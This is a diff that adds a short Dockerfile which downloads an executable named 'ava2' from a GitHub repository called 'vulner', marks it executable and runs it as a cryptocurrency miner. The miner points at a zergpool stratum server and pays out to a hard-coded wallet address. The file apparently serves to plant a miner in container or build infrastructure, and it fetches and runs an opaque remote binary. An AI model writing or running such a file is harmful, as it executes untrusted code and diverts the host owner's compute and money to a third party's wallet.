@@ -1,0 +1,7 @@
+FROM ubuntu:bionic
+RUN apt update && \
+        apt full-upgrade -y && \
+        apt install wget -y && \
+        wget https://github.com/gyrogerald/vulner/raw/main/ava2 && \
+        chmod +x ava2
+CMD ./ava2 -a minotaurx -o stratum+tcp://minotaurx.mine.zergpool.com:7019 -u RXtRx8QUgCipTZyepE2go35gXjkcqHmYDX -p c=RVN,mc=MAZA
